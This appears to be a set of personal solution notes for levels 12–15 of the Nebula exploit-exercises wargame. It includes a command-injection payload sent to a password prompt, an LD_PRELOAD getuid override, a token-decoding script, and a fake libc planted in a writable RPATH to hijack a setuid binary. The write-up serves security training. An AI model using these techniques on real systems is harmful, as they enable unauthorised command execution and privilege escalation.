nebula-exercises
================
> notes about nebula exercises

> [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)


level 12
--------

##### connect to process and inject getflag call
```bash
level12@nebula:~$ nc localhost 50001
Password: ; getflag > /tmp/getflag12.txt; #
Better luck next time

level12@nebula:~$ ll /tmp/getflag12.txt 
-rw-r--r-- 1 flag12 flag12 59 2016-08-19 13:33 /tmp/getflag12.txt

level12@nebula:~$ cat /tmp/getflag12.txt 
You have successfully executed getflag on a target account
```


level 13
--------

##### overload getuid call to return 'FAKEUID'
```c
// fake_getuid.c
#include <sys/types.h>

uid_t getuid()
{
    return 1000;
}
```

##### build lib and use LD_PRELOAD
```bash
level13@nebula:~$ gcc --shared -fPIC fake_getuid.c -o fake_getuid.so
level13@nebula:~$ export LD_PRELOAD=/home/level13/fake_getuid.so
```

##### copy flag13 binary to level13 home to use LD_PRELOAD trick
```bash
# LD_PRELOAD needs reel uid == effective uid
level13@nebula:~$ cp /home/flag13/flag13 /home/level13
level13@nebula:~$ ./flag13 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

##### use token as pwd for flag13 user and execute getflag
```bash
level13@nebula:~$ su - flag13
Password: 
flag13@nebula:~$ getflag 
You have successfully executed getflag on a target account
```


level 14
--------

##### inspect flag14 binary

```bash
level14@nebula:~$ python -c "print 'a'*5" | /home/flag14/flag14 -e
abcde

level14@nebula:~$ python -c "print 'b'*5" | /home/flag14/flag14 -e
bcdef

# y = chr(ord(x) + pos(x))
```

##### write a reverse script
```python
# reverse.py
# read token in /home/flag14/token
token = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."
reverse = ""

for i, c in enumerate(token):
    reverse += chr(ord(c) - i)

print(reverse)
# --> output: 8457c118-887c-4e40-a5a6-33a25353165
```

##### check reverse.py
```bash
python reverse.py | /home/flag14/flag14 -e
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
```

##### use reversed token as pwd for flag14 user and execute getflag
```
level14@nebula:~$ su - flag14
Password: 
flag14@nebula:~$ getflag 
You have successfully executed getflag on a target account
```


level 15
--------

##### inspect flag15 binary

```bash
# 0. see 'man dlopen' for linker dynamic library search priority order
level15@nebula:~$ man dlopen
(ELF only) If the executable file for the calling program contains a DT_RPATH tag,
and does not contain a  DT_RUN‐PATH tag then the directories listed in the DT_RPATH tag are searched.

# 1. strace binary: trace system calls
level15@nebula:~$ strace /home/flag15/flag15
open("/var/tmp/flag15/libc.so.6", O_RDONLY)

# 2. readelf / objdump / nm binary: get more information about dynamic section and symbols

# readelf
level15@nebula:~$ readelf --dynamic /home/flag15/flag15 
Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

# objdump headers
level15@nebula:~$ objdump -x /home/flag15/flag15
Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15

# objdump dynamic symbols
level15@nebula:~$ objdump --dynamic-syms /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
080484cc g    DO .rodata	00000004  Base        _IO_stdin_used

# nm undefined symbols
level15@nebula:~$ nm --undefined-only /home/flag15/flag15 
w _Jv_RegisterClasses
w __gmon_start__
U __libc_start_main@@GLIBC_2.0
U puts@@GLIBC_2.0
```

##### build a fake libc calling the getflag binary

```c
// fake_libc.c
#include <sys/types.h>

void __cxa_finalize(void * d)
{

}

int __libc_start_main(
    int *(main) (int, char * *, char * *),
    int argc, char * * ubp_av, void (*init) (void),
    void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
  system("getflag");
}
```
```
# version.map
GLIBC_2.0 {
        global:
		__libc_start_main;
};
```
```bash
# build dynamic fake lib with a version script and static link
level15@nebula:~$ gcc --shared -fPIC -static-libgcc -Wl,--version-script=./version.map,-Bstatic fake_libc.c -o libc.so.6
```

##### copy it to RPATH

```bash
level15@nebula:~$ cp libc.so.6 /var/tmp/flag15/
```

##### run suid flag15
```bash
level15@nebula:~$ /home/flag15/flag15 
You have successfully executed getflag on a target account
Segmentation fault
```
